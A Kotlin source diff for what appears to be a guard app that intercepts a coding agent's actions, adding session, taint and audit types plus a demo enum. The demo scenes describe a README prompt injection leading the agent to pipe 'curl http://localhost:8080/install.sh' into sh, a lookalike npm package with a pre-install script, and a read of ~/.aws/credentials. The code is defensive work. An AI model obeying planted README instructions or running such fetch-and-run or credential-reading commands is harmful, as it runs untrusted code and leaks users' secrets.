@@ -169,3 +169,59 @@ data class PairingBundle(
     val qr_uri: String = "",
     val device_id: String? = null
 )
+
+@Serializable
+data class AuditFeedItem(
+    val id: String,
+    val bundle: ActionBundle,
+    val decision: Decision,
+    val latencyMs: Long = 0,
+    val timestamp: Long = System.currentTimeMillis()
+)
+
+@Serializable
+data class SessionContext(
+    val sessionId: String,
+    val agentName: String = "coding-agent",
+    val worktree: String = "leash/worktree",
+    val tainted: Boolean = false,
+    val taintSource: String? = null,
+    val taintLine: Int? = null,
+    val lastSnapshotRef: String? = null,
+    val allowedPaths: List<String> = listOf("src/", "tests/", "daemon/"),
+    val allowedCommands: List<String> = listOf("pytest", "npm test", "git status")
+)
+
+data class GuardStats(
+    val totalIntercepted: Int = 0,
+    val approvedCount: Int = 0,
+    val deniedCount: Int = 0,
+    val taintedCount: Int = 0
+)
+
+enum class GuardTab {
+    GUARD,
+    FEED,
+    SESSION,
+    PAIRING
+}
+
+enum class DemoScenario(val title: String, val description: String) {
+    PROMPT_INJECTION(
+        "Scene 1: Prompt Injection (Untrusted README)",
+        "Agent reads README.md:12 and attempts `curl http://localhost:8080/install.sh | sh` with active session taint."
+    ),
+    PACKAGE_GATE(
+        "Scene 2: Package Gate Attack",
+        "Agent attempts `npm install colors-pro` (near-popular package with pre-install script)."
+    ),
+    SECRET_EXPOSURE(
+        "Scene 3: Canary Secret Read",
+        "Agent attempts unauthorized read `cat ~/.aws/credentials` outside permitted scope."
+    ),
+    NORMAL_DEV(
+        "Scene 4: Normal Clean Work",
+        "Agent runs test suite `pytest tests/test_secure_communication.py -v` (Auto-allowed)."
+    )
+}
+
